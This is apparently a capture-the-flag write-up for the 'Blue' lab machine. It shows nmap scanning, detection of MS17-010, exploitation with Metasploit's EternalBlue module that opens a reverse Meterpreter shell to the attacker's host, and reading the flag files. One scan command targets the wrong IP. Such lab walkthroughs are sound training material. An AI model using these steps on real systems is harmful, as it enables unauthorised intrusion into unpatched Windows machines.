
# Blue

We create a working directory named "Blue" to organize our files and findings:

```ruby
mkdir Blue
```

## Port Scanning

We ping the target IP (10.10.10.40) to confirm connectivity

```ruby
ping 10.10.10.40
```

The Time To Live (TTL) of 127 indicates it's likely a Windows machine.

### Nmap Scan

We use Nmap to perform a comprehensive port scan, identifying open ports.

```ruby
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.3 -oG allPorts
```


```ruby
PORT      STATE SERVICE      REASON
135/tcp   open  msrpc        syn-ack ttl 127
139/tcp   open  netbios-ssn  syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
49152/tcp open  unknown      syn-ack ttl 127
49153/tcp open  unknown      syn-ack ttl 127
49154/tcp open  unknown      syn-ack ttl 127
49155/tcp open  unknown      syn-ack ttl 127
49157/tcp open  unknown      syn-ack ttl 127

```

A more detailed scan is then run on the discovered open ports.

```ruby
nmap --script=firewall-bypass -p135,139,445,49152,49153,49154,49155,49157 -vvv -oN targeted 10.10.10.40
```

```ruby

Host script results:
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
|_smb-vuln-ms10-054: false
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

```

The scan reveals the machine is vulnerable to MS17-010 (EternalBlue).


## Exploiting MS17-010

We use Metasploit to exploit the MS17-010 vulnerability.


```ruby
searchsploit ms17-010
```

We find:

``` ruby
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14   average  Yes
```

The `exploit/windows/smb/ms17_010_eternalblue` module is selected.
We set our local host (LHOST) and remote host (RHOSTS) IP addresses.

```ruby
msf6 exploit(windows/smb/ms17_010_eternalblue) > setg LHOST 10.10.14.13
LHOST => 10.10.14.13

msf6 exploit(windows/smb/ms17_010_eternalblue) > setg RHOSTS 10.10.10.40
RHOSTS => 10.10.10.40
```
The exploit is executed, successfully giving us a Meterpreter session.

```ruby 
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.10.14.13:4444 
[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.10.40:445 - The target is vulnerable.
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Connection established for exploitation.
.....
[*] Meterpreter session 2 opened (10.10.14.13:4444 -> 10.10.10.40:49164) at 2023-06-28 09:20:26 -0400
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
```
We use the Meterpreter shell to navigate the compromised system.

```ruby
meterpreter > ls
Listing: C:\Windows\system32
...
```

### Improving the Shell

To get a more familiar Windows command prompt, we execute `cmd.exe` through Meterpreter.

```ruby 
meterpreter > execute -c -f cmd.exe -H -i -d
```

This gives us a Windows-like shell.

```ruby 
Process 1820 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>

```


#### Flag Hunting

We use the `dir` command with specific parameters to search for `user.txt` and `root.txt` files.

```ruby
dir /s /b root.txt user.txt
```
The flags are located in the Desktop folders of the 'haris' and 'Administrator' users respectively.
 
```ruby
C:\Users\Administrator\Desktop\root.txt
C:\Users\haris\Desktop\user.txt
```
We use the `type` command to read the contents of these files, revealing the flags.

```ruby 
type C:\Users\Administrator\Desktop\root.txt
```
